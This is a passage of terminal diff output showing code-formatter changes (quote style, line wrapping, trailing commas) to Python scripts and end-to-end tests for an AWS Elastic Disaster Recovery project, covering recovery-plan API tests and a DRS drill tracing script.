             \u001b[0m\n\u001b[31m-                        if instances['Reservations']:\u001b[0m\n\u001b[31m-                            for reservation in instances['Reservations']:\u001b[0m\n\u001b[31m-                                for instance in reservation['Instances']:\u001b[0m\n\u001b[31m-                                    print(f\"   \u2705 Instance: {instance['InstanceId']}\")\u001b[0m\n\u001b[31m-                                    print(f\"      State: {instance['State']['Name']}\")\u001b[0m\n\u001b[31m-                                    print(f\"      Launch Time: {instance['LaunchTime']}\")\u001b[0m\n\u001b[31m-                                    print(f\"      Private IP: {instance.get('PrivateIpAddress', 'N/A')}\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                        if instances[\"Reservations\"]:\u001b[0m\n\u001b[32m+                            for reservation in instances[\"Reservations\"]:\u001b[0m\n\u001b[32m+                                for instance in reservation[\"Instances\"]:\u001b[0m\n\u001b[32m+                                    print(\u001b[0m\n\u001b[32m+                                        f\"   \u2705 Instance: {instance['InstanceId']}\"\u001b[0m\n\u001b[32m+                                    )\u001b[0m\n\u001b[32m+                                    print(\u001b[0m\n\u001b[32m+                                        f\"      State: {instance['State']['Name']}\"\u001b[0m\n\u001b[32m+                                    )\u001b[0m\n\u001b[32m+                                    print(\u001b[0m\n\u001b[32m+                                        f\"      Launch Time: {instance['LaunchTime']}\"\u001b[0m\n\u001b[32m+                                    )\u001b[0m\n\u001b[32m+                                    print(\u001b[0m\n\u001b[32m+                                        f\"      Private IP: {instance.get('PrivateIpAddress', 'N/A')}\"\u001b[0m\n\u001b[32m+                                    )\u001b[0m\n                             return True\n                         else:\n                             print(\"   \u274c No EC2 instances found\")\n                             return False\n\u001b[31m-                    \u001b[0m\n\u001b[31m-                    return wave_status == 'COMPLETED'\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+                    return wave_status == \"COMPLETED\"\u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             print(f\"\u274c Error: {e}\")\n             return False\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         time.sleep(15)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\u23f1\ufe0f Timeout after {max_wait_minutes} minutes\")\n     return False\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n\u001b[31m-    execution_id = sys.argv[1] if len(sys.argv) > 1 else \"e11a2dbc-5279-4829-b23c-2d4862ca8c68\"\u001b[0m\n\u001b[31m-    plan_id = sys.argv[2] if len(sys.argv) > 2 else \"ba8b28e2-7568-4c03-bff0-9f289262c1a6\"\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    execution_id = (\u001b[0m\n\u001b[32m+        sys.argv[1]\u001b[0m\n\u001b[32m+        if len(sys.argv) > 1\u001b[0m\n\u001b[32m+        else \"e11a2dbc-5279-4829-b23c-2d4862ca8c68\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    plan_id = (\u001b[0m\n\u001b[32m+        sys.argv[2]\u001b[0m\n\u001b[32m+        if len(sys.argv) > 2\u001b[0m\n\u001b[32m+        else \"ba8b28e2-7568-4c03-bff0-9f289262c1a6\"\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     success = monitor_execution(execution_id, plan_id)\n     sys.exit(0 if success else 1)\n\u001b[1m--- tests/python/e2e/test_recovery_plan_bugs.py\t2025-11-21 02:56:07.496359+00:00\u001b[0m\n\u001b[1m+++ tests/python/e2e/test_recovery_plan_bugs.py\t2026-01-02 15:49:03.517645+00:00\u001b[0m\n\u001b[36m@@ -7,25 +7,28 @@\u001b[0m\n import requests\n import pytest\n from typing import Dict, Any\n \n # API Configuration\n\u001b[31m-API_BASE_URL = os.getenv('API_BASE_URL', 'https://etv40zymeg.execute-api.us-east-1.amazonaws.com/test')\u001b[0m\n\u001b[32m+API_BASE_URL = os.getenv(\u001b[0m\n\u001b[32m+    \"API_BASE_URL\",\u001b[0m\n\u001b[32m+    \"https://etv40zymeg.execute-api.us-east-1.amazonaws.com/test\",\u001b[0m\n\u001b[32m+)\u001b[0m\n API_ENDPOINT = f\"{API_BASE_URL}/recovery-plans\"\n \n # Test credentials (from .env.test or environment)\n\u001b[31m-ID_TOKEN = os.getenv('ID_TOKEN', '')  # Must be set before running\u001b[0m\n\u001b[32m+ID_TOKEN = os.getenv(\"ID_TOKEN\", \"\")  # Must be set before running\u001b[0m\n \n \n @pytest.fixture\n def auth_headers():\n     \"\"\"Authentication headers for API calls.\"\"\"\n     if not ID_TOKEN:\n         pytest.skip(\"ID_TOKEN not set - run manual auth first\")\n     return {\n\u001b[31m-        'Authorization': ID_TOKEN,  # No 'Bearer' prefix for API Gateway\u001b[0m\n\u001b[31m-        'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+        \"Authorization\": ID_TOKEN,  # No 'Bearer' prefix for API Gateway\u001b[0m\n\u001b[32m+        \"Content-Type\": \"application/json\",\u001b[0m\n     }\n \n \n @pytest.fixture\n def test_plan_data():\n\u001b[36m@@ -35,156 +38,167 @@\u001b[0m\n         \"description\": \"E2E test for P1 bug validation\",\n         \"waves\": [\n             {\n                 \"waveName\": \"Database\",\n                 \"protectionGroupIds\": [\"pg-database-123\"],\n\u001b[31m-                \"serverIds\": [\"s-3d75cdc0d9a28a725\", \"s-3afa164776f93ce4f\"]  # CRITICAL: Arrays\u001b[0m\n\u001b[32m+                \"serverIds\": [\u001b[0m\n\u001b[32m+                    \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"s-3afa164776f93ce4f\",\u001b[0m\n\u001b[32m+                ],  # CRITICAL: Arrays\u001b[0m\n             },\n             {\n\u001b[31m-                \"waveName\": \"Application\", \u001b[0m\n\u001b[32m+                \"waveName\": \"Application\",\u001b[0m\n                 \"protectionGroupIds\": [\"pg-application-456\"],\n\u001b[31m-                \"serverIds\": [\"s-app1\", \"s-app2\"]  # CRITICAL: Arrays\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ]\u001b[0m\n\u001b[32m+                \"serverIds\": [\"s-app1\", \"s-app2\"],  # CRITICAL: Arrays\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n     }\n \n \n def test_create_recovery_plan(auth_headers, test_plan_data):\n     \"\"\"Test: Create Recovery Plan via API.\"\"\"\n     response = requests.post(\n\u001b[31m-        API_ENDPOINT,\u001b[0m\n\u001b[31m-        headers=auth_headers,\u001b[0m\n\u001b[31m-        json=test_plan_data\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        API_ENDPOINT, headers=auth_headers, json=test_plan_data\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     assert response.status_code == 201, f\"Create failed: {response.text}\"\n     data = response.json()\n\u001b[31m-    assert 'recoveryPlanId' in data\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    assert \"recoveryPlanId\" in data\u001b[0m\n\u001b[32m+\u001b[0m\n     # Store for cleanup\n\u001b[31m-    plan_id = data['recoveryPlanId']\u001b[0m\n\u001b[32m+    plan_id = data[\"recoveryPlanId\"]\u001b[0m\n     return plan_id\n \n \n\u001b[31m-def test_edit_recovery_plan_validates_array_format(auth_headers, test_plan_data):\u001b[0m\n\u001b[32m+def test_edit_recovery_plan_validates_array_format(\u001b[0m\n\u001b[32m+    auth_headers, test_plan_data\u001b[0m\n\u001b[32m+):\u001b[0m\n     \"\"\"\n     Test: P1 Wave Bug Fix - ServerIds remain arrays after edit.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Bug: transform_rp_to_camelcase() converted ServerIds to strings\n     Fix: Preserve ServerIds as arrays in transformation\n     \"\"\"\n     # Create plan\n     create_response = requests.post(\n\u001b[31m-        API_ENDPOINT,\u001b[0m\n\u001b[31m-        headers=auth_headers,\u001b[0m\n\u001b[31m-        json=test_plan_data\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    assert create_response.status_code == 201, f\"Create failed: {create_response.text}\"\u001b[0m\n\u001b[32m+        API_ENDPOINT, headers=auth_headers, json=test_plan_data\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+    assert (\u001b[0m\n\u001b[32m+        create_response.status_code == 201\u001b[0m\n\u001b[32m+    ), f\"Create failed: {create_response.text}\"\u001b[0m\n     response_data = create_response.json()\n     # API returns PlanId, not recoveryPlanId\n\u001b[31m-    plan_id = response_data.get('PlanId') or response_data.get('recoveryPlanId') or response_data.get('planId')\u001b[0m\n\u001b[32m+    plan_id = (\u001b[0m\n\u001b[32m+        response_data.get(\"PlanId\")\u001b[0m\n\u001b[32m+        or response_data.get(\"recoveryPlanId\")\u001b[0m\n\u001b[32m+        or response_data.get(\"planId\")\u001b[0m\n\u001b[32m+    )\u001b[0m\n     assert plan_id, f\"No plan ID in response: {response_data}\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         # Get plan for edit\n         get_response = requests.get(\n\u001b[31m-            f\"{API_ENDPOINT}/{plan_id}\",\u001b[0m\n\u001b[31m-            headers=auth_headers\u001b[0m\n\u001b[32m+            f\"{API_ENDPOINT}/{plan_id}\", headers=auth_headers\u001b[0m\n         )\n\u001b[31m-        assert get_response.status_code == 200, f\"GET failed: {get_response.status_code} - {get_response.text}\"\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            get_response.status_code == 200\u001b[0m\n\u001b[32m+        ), f\"GET failed: {get_response.status_code} - {get_response.text}\"\u001b[0m\n         plan_data = get_response.json()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # CRITICAL VALIDATION: Check ServerIds are arrays, not strings\n\u001b[31m-        waves = plan_data.get('waves', [])\u001b[0m\n\u001b[32m+        waves = plan_data.get(\"waves\", [])\u001b[0m\n         assert len(waves) >= 2, \"Expected at least 2 waves\"\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for wave in waves:\n\u001b[31m-            server_ids = wave.get('serverIds', [])\u001b[0m\n\u001b[32m+            server_ids = wave.get(\"serverIds\", [])\u001b[0m\n             # BUG VALIDATION: ServerIds must be list/array type\n\u001b[31m-            assert isinstance(server_ids, list), \\\u001b[0m\n\u001b[31m-                f\"Wave '{wave.get('waveName')}' has ServerIds as {type(server_ids).__name__}, expected list\"\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            assert isinstance(\u001b[0m\n\u001b[32m+                server_ids, list\u001b[0m\n\u001b[32m+            ), f\"Wave '{wave.get('waveName')}' has ServerIds as {type(server_ids).__name__}, expected list\"\u001b[0m\n\u001b[32m+\u001b[0m\n             # Validate array contains strings, not nested arrays\n             for server_id in server_ids:\n\u001b[31m-                assert isinstance(server_id, str), \\\u001b[0m\n\u001b[31m-                    f\"ServerIds contains {type(server_id).__name__}, expected string\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                assert isinstance(\u001b[0m\n\u001b[32m+                    server_id, str\u001b[0m\n\u001b[32m+                ), f\"ServerIds contains {type(server_id).__name__}, expected string\"\u001b[0m\n\u001b[32m+\u001b[0m\n         print(f\"\u2705 P1 WAVE BUG FIX VALIDATED: ServerIds are arrays\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Edit plan (update description)\n\u001b[31m-        plan_data['description'] = \"Updated via E2E test\"\u001b[0m\n\u001b[32m+        plan_data[\"description\"] = \"Updated via E2E test\"\u001b[0m\n         edit_response = requests.put(\n\u001b[31m-            f\"{API_ENDPOINT}/{plan_id}\",\u001b[0m\n\u001b[31m-            headers=auth_headers,\u001b[0m\n\u001b[31m-            json=plan_data\u001b[0m\n\u001b[32m+            f\"{API_ENDPOINT}/{plan_id}\", headers=auth_headers, json=plan_data\u001b[0m\n         )\n\u001b[31m-        assert edit_response.status_code == 200, f\"Edit failed: {edit_response.text}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            edit_response.status_code == 200\u001b[0m\n\u001b[32m+        ), f\"Edit failed: {edit_response.text}\"\u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify ServerIds still arrays after edit\n         edited_data = edit_response.json()\n\u001b[31m-        edited_waves = edited_data.get('waves', [])\u001b[0m\n\u001b[32m+        edited_waves = edited_data.get(\"waves\", [])\u001b[0m\n         for wave in edited_waves:\n\u001b[31m-            server_ids = wave.get('serverIds', [])\u001b[0m\n\u001b[31m-            assert isinstance(server_ids, list), \\\u001b[0m\n\u001b[31m-                f\"After edit: Wave '{wave.get('waveName')}' ServerIds became {type(server_ids).__name__}\"\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        print(f\"\u2705 P1 WAVE BUG FIX VALIDATED AFTER EDIT: ServerIds remain arrays\")\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            server_ids = wave.get(\"serverIds\", [])\u001b[0m\n\u001b[32m+            assert isinstance(\u001b[0m\n\u001b[32m+                server_ids, list\u001b[0m\n\u001b[32m+            ), f\"After edit: Wave '{wave.get('waveName')}' ServerIds became {type(server_ids).__name__}\"\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"\u2705 P1 WAVE BUG FIX VALIDATED AFTER EDIT: ServerIds remain arrays\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n     finally:\n         # Cleanup\n         requests.delete(f\"{API_ENDPOINT}/{plan_id}\", headers=auth_headers)\n \n \n def test_delete_recovery_plan_performance(auth_headers, test_plan_data):\n     \"\"\"\n     Test: P1 Delete Bug Fix - Uses scan with FilterExpression.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Bug: Tried to use non-existent GSI, caused error\n     Fix: Use scan() with FilterExpression for delete operation\n     \"\"\"\n     # Create plan\n     create_response = requests.post(\n\u001b[31m-        API_ENDPOINT,\u001b[0m\n\u001b[31m-        headers=auth_headers,\u001b[0m\n\u001b[31m-        json=test_plan_data\u001b[0m\n\u001b[32m+        API_ENDPOINT, headers=auth_headers, json=test_plan_data\u001b[0m\n     )\n     assert create_response.status_code == 201\n\u001b[31m-    plan_id = create_response.json()['recoveryPlanId']\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    plan_id = create_response.json()[\"recoveryPlanId\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     # Delete plan - should succeed without error\n     delete_response = requests.delete(\n\u001b[31m-        f\"{API_ENDPOINT}/{plan_id}\",\u001b[0m\n\u001b[31m-        headers=auth_headers\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/{plan_id}\", headers=auth_headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     # CRITICAL VALIDATION: Delete succeeds (no GSI error)\n\u001b[31m-    assert delete_response.status_code in [200, 204], \\\u001b[0m\n\u001b[31m-        f\"Delete failed with {delete_response.status_code}: {delete_response.text}\"\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    assert delete_response.status_code in [\u001b[0m\n\u001b[32m+        200,\u001b[0m\n\u001b[32m+        204,\u001b[0m\n\u001b[32m+    ], f\"Delete failed with {delete_response.status_code}: {delete_response.text}\"\u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 P1 DELETE BUG FIX VALIDATED: Delete succeeded using scan\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Verify plan deleted - GET should return 404\n     get_response = requests.get(\n\u001b[31m-        f\"{API_ENDPOINT}/{plan_id}\",\u001b[0m\n\u001b[31m-        headers=auth_headers\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/{plan_id}\", headers=auth_headers\u001b[0m\n     )\n     assert get_response.status_code == 404, \"Plan should be deleted\"\n \n \n if __name__ == \"__main__\":\n     \"\"\"Run tests directly for quick validation.\"\"\"\n     print(\"=\" * 60)\n     print(\"E2E API Test: P1 Bug Validation\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if not ID_TOKEN:\n         print(\"\u274c ERROR: ID_TOKEN environment variable not set\")\n         print(\"   Set it from your authenticated session:\")\n         print(\"   export ID_TOKEN='your_token_here'\")\n         exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': ID_TOKEN, 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\"Authorization\": ID_TOKEN, \"Content-Type\": \"application/json\"}\u001b[0m\n     plan_data = {\n         \"PlanName\": \"TEST-E2E-API-P1-VALIDATION\",\n         \"Description\": \"E2E test for P1 bug validation\",\n         \"AccountId\": \"123456789012\",\n         \"Region\": \"us-east-1\",\n\u001b[36m@@ -194,27 +208,27 @@\u001b[0m\n         \"Waves\": [\n             {\n                 \"waveNumber\": 1,\n                 \"WaveName\": \"Database\",\n                 \"ProtectionGroupIds\": [\"pg-database-123\"],\n\u001b[31m-                \"ServerIds\": [\"s-3d75cdc0d9a28a725\", \"s-3afa164776f93ce4f\"]\u001b[0m\n\u001b[32m+                \"ServerIds\": [\"s-3d75cdc0d9a28a725\", \"s-3afa164776f93ce4f\"],\u001b[0m\n             }\n\u001b[31m-        ]\u001b[0m\n\u001b[32m+        ],\u001b[0m\n     }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n1. Testing Wave Bug Fix...\")\n     try:\n         test_edit_recovery_plan_validates_array_format(headers, plan_data)\n     except AssertionError as e:\n         print(f\"\u274c Wave test failed: {e}\")\n         # Try to get more details\n         response = requests.post(API_ENDPOINT, headers=headers, json=plan_data)\n         print(f\"Status: {response.status_code}\")\n         print(f\"Response: {response.text}\")\n         raise\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n2. Testing Delete Bug Fix...\")\n     test_delete_recovery_plan_performance(headers, plan_data)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\" + \"=\" * 60)\n     print(\"\u2705 ALL P1 BUG FIXES VALIDATED\")\n     print(\"=\" * 60)\n\u001b[1m--- scripts/test_drs_drill_trace.py\t2025-12-08 04:46:44.439485+00:00\u001b[0m\n\u001b[1m+++ scripts/test_drs_drill_trace.py\t2026-01-02 15:49:03.518708+00:00\u001b[0m\n\u001b[36m@@ -8,186 +8,212 @@\u001b[0m\n import json\n import time\n import sys\n \n # Test configuration - using first 2 servers\n\u001b[31m-SOURCE_SERVER_IDS = ['s-3c1730a9e0771ea14', 's-3d75cdc0d9a28a725']  # EC2AMAZ-4IMB9PN, EC2AMAZ-RLP9U5V\u001b[0m\n\u001b[31m-REGION = 'us-east-1'\u001b[0m\n\u001b[32m+SOURCE_SERVER_IDS = [\u001b[0m\n\u001b[32m+    \"s-3c1730a9e0771ea14\",\u001b[0m\n\u001b[32m+    \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+]  # EC2AMAZ-4IMB9PN, EC2AMAZ-RLP9U5V\u001b[0m\n\u001b[32m+REGION = \"us-east-1\"\u001b[0m\n IS_DRILL = True\n\u001b[32m+\u001b[0m\n \n def print_section(title):\n     print(f\"\\n{'='*80}\")\n     print(f\"  {title}\")\n     print(f\"{'='*80}\\n\")\n \n\u001b[32m+\u001b[0m\n def test_drs_recovery():\n     \"\"\"Test DRS recovery with full tracing\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    drs = boto3.client('drs', region_name=REGION)\u001b[0m\n\u001b[31m-    ec2 = boto3.client('ec2', region_name=REGION)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    drs = boto3.client(\"drs\", region_name=REGION)\u001b[0m\n\u001b[32m+    ec2 = boto3.client(\"ec2\", region_name=REGION)\u001b[0m\n\u001b[32m+\u001b[0m\n     print_section(\"STEP 1: Verify Source Servers Exist\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n         response = drs.describe_source_servers()\n\u001b[31m-        servers = response.get('items', [])\u001b[0m\n\u001b[32m+        servers = response.get(\"items\", [])\u001b[0m\n         print(f\"\u2713 Found {len(servers)} source servers in DRS\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for server in servers:\n\u001b[31m-            sid = server['sourceServerID']\u001b[0m\n\u001b[31m-            state = server.get('lifeCycle', {}).get('state', 'UNKNOWN')\u001b[0m\n\u001b[32m+            sid = server[\"sourceServerID\"]\u001b[0m\n\u001b[32m+            state = server.get(\"lifeCycle\", {}).get(\"state\", \"UNKNOWN\")\u001b[0m\n             print(f\"  - {sid}: {state}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             if sid in SOURCE_SERVER_IDS:\n                 print(f\"    \u2713 Target server found\")\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check launch configuration\n                 try:\n\u001b[31m-                    launch_config = drs.get_launch_configuration(sourceServerID=sid)\u001b[0m\n\u001b[31m-                    print(f\"    Launch disposition: {launch_config.get('launchDisposition', 'UNKNOWN')}\")\u001b[0m\n\u001b[31m-                    print(f\"    Target instance type: {launch_config.get('targetInstanceTypeRightSizingMethod', 'UNKNOWN')}\")\u001b[0m\n\u001b[32m+                    launch_config = drs.get_launch_configuration(\u001b[0m\n\u001b[32m+                        sourceServerID=sid\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                    print(\u001b[0m\n\u001b[32m+                        f\"    Launch disposition: {launch_config.get('launchDisposition', 'UNKNOWN')}\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+                    print(\u001b[0m\n\u001b[32m+                        f\"    Target instance type: {launch_config.get('targetInstanceTypeRightSizingMethod', 'UNKNOWN')}\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                 except Exception as e:\n                     print(f\"    \u26a0 Could not get launch config: {e}\")\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n     except Exception as e:\n         print(f\"\u2717 Failed to describe source servers: {e}\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print_section(\"STEP 2: Start Recovery Job\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     try:\n\u001b[31m-        source_servers = [{'sourceServerID': sid} for sid in SOURCE_SERVER_IDS]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        source_servers = [{\"sourceServerID\": sid} for sid in SOURCE_SERVER_IDS]\u001b[0m\n\u001b[32m+\u001b[0m\n         print(f\"Calling drs.start_recovery():\")\n         print(f\"  sourceServers: {source_servers}\")\n         print(f\"  isDrill: {IS_DRILL}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = drs.start_recovery(\n\u001b[31m-            sourceServers=source_servers,\u001b[0m\n\u001b[31m-            isDrill=IS_DRILL\u001b[0m\n\u001b[32m+            sourceServers=source_servers, isDrill=IS_DRILL\u001b[0m\n         )\n\u001b[31m-        \u001b[0m\n\u001b[31m-        job = response.get('job', {})\u001b[0m\n\u001b[31m-        job_id = job.get('jobID')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        job = response.get(\"job\", {})\u001b[0m\n\u001b[32m+        job_id = job.get(\"jobID\")\u001b[0m\n\u001b[32m+\u001b[0m\n         print(f\"\\n\u2713 Job created: {job_id}\")\n         print(f\"  Status: {job.get('status')}\")\n         print(f\"  Type: {job.get('type')}\")\n\u001b[31m-        \u001b[0m\n\u001b[31m-        participating_servers = job.get('participatingServers', [])\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        participating_servers = job.get(\"participatingServers\", [])\u001b[0m\n         print(f\"  Participating servers: {len(participating_servers)}\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for ps in participating_servers:\n\u001b[31m-            print(f\"    - {ps.get('sourceServerID')}: {ps.get('launchStatus', 'UNKNOWN')}\")\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            print(\u001b[0m\n\u001b[32m+                f\"    - {ps.get('sourceServerID')}: {ps.get('launchStatus', 'UNKNOWN')}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n\u001b[32m+\u001b[0m\n     except Exception as e:\n         print(f\"\u2717 Failed to start recovery: {e}\")\n         import traceback\n\u001b[32m+\u001b[0m\n         traceback.print_exc()\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print_section(\"STEP 3: Poll Job Status\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     max_polls = 60  # 10 minutes\n     poll_interval = 10\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     for i in range(max_polls):\n         try:\n             time.sleep(poll_interval)\n\u001b[31m-            \u001b[0m\n\u001b[31m-            response = drs.describe_jobs(filters={'jobIDs': [job_id]})\u001b[0m\n\u001b[31m-            jobs = response.get('items', [])\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            response = drs.describe_jobs(filters={\"jobIDs\": [job_id]})\u001b[0m\n\u001b[32m+            jobs = response.get(\"items\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n             if not jobs:\n                 print(f\"\u2717 Job {job_id} not found\")\n                 return False\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             job = jobs[0]\n\u001b[31m-            job_status = job.get('status')\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            job_status = job.get(\"status\")\u001b[0m\n\u001b[32m+\u001b[0m\n             print(f\"\\nPoll {i+1}/{max_polls} - Job Status: {job_status}\")\n\u001b[31m-            \u001b[0m\n\u001b[31m-            participating_servers = job.get('participatingServers', [])\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            participating_servers = job.get(\"participatingServers\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n             for ps in participating_servers:\n\u001b[31m-                sid = ps.get('sourceServerID')\u001b[0m\n\u001b[31m-                launch_status = ps.get('launchStatus', 'UNKNOWN')\u001b[0m\n\u001b[31m-                recovery_instance_id = ps.get('recoveryInstanceID', 'None')\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                sid = ps.get(\"sourceServerID\")\u001b[0m\n\u001b[32m+                launch_status = ps.get(\"launchStatus\", \"UNKNOWN\")\u001b[0m\n\u001b[32m+                recovery_instance_id = ps.get(\"recoveryInstanceID\", \"None\")\u001b[0m\n\u001b[32m+\u001b[0m\n                 print(f\"  {sid}:\")\n                 print(f\"    Launch Status: {launch_status}\")\n                 print(f\"    Recovery Instance ID: {recovery_instance_id}\")\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 # Check if EC2 instance exists\n\u001b[31m-                if recovery_instance_id and recovery_instance_id != 'None':\u001b[0m\n\u001b[32m+                if recovery_instance_id and recovery_instance_id != \"None\":\u001b[0m\n                     try:\n\u001b[31m-                        ec2_response = ec2.describe_instances(InstanceIds=[recovery_instance_id])\u001b[0m\n\u001b[31m-                        if ec2_response['Reservations']:\u001b[0m\n\u001b[31m-                            instance = ec2_response['Reservations'][0]['Instances'][0]\u001b[0m\n\u001b[31m-                            ec2_state = instance['State']['Name']\u001b[0m\n\u001b[32m+                        ec2_response = ec2.describe_instances(\u001b[0m\n\u001b[32m+                            InstanceIds=[recovery_instance_id]\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+                        if ec2_response[\"Reservations\"]:\u001b[0m\n\u001b[32m+                            instance = ec2_response[\"Reservations\"][0][\u001b[0m\n\u001b[32m+                                \"Instances\"\u001b[0m\n\u001b[32m+                            ][0]\u001b[0m\n\u001b[32m+                            ec2_state = instance[\"State\"][\"Name\"]\u001b[0m\n                             print(f\"    EC2 State: {ec2_state}\")\n\u001b[31m-                            \u001b[0m\n\u001b[32m+\u001b[0m\n                             # Check tags\n\u001b[31m-                            tags = {t['Key']: t['Value'] for t in instance.get('Tags', [])}\u001b[0m\n\u001b[31m-                            has_drs_tag = 'AWSElasticDisasterRecoveryManaged' in tags\u001b[0m\n\u001b[32m+                            tags = {\u001b[0m\n\u001b[32m+                                t[\"Key\"]: t[\"Value\"]\u001b[0m\n\u001b[32m+                                for t in instance.get(\"Tags\", [])\u001b[0m\n\u001b[32m+                            }\u001b[0m\n\u001b[32m+                            has_drs_tag = (\u001b[0m\n\u001b[32m+                                \"AWSElasticDisasterRecoveryManaged\" in tags\u001b[0m\n\u001b[32m+                            )\u001b[0m\n                             print(f\"    Has DRS Tag: {has_drs_tag}\")\n                     except Exception as e:\n                         print(f\"    \u26a0 Could not describe EC2 instance: {e}\")\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Check completion\n\u001b[31m-            if job_status == 'COMPLETED':\u001b[0m\n\u001b[32m+            if job_status == \"COMPLETED\":\u001b[0m\n                 print(f\"\\n\u2713 Job completed successfully\")\n                 break\n\u001b[31m-            elif job_status in ['FAILED', 'TERMINATED']:\u001b[0m\n\u001b[32m+            elif job_status in [\"FAILED\", \"TERMINATED\"]:\u001b[0m\n                 print(f\"\\n\u2717 Job failed with status: {job_status}\")\n                 return False\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             print(f\"\u2717 Error polling job: {e}\")\n             import traceback\n\u001b[32m+\u001b[0m\n             traceback.print_exc()\n             return 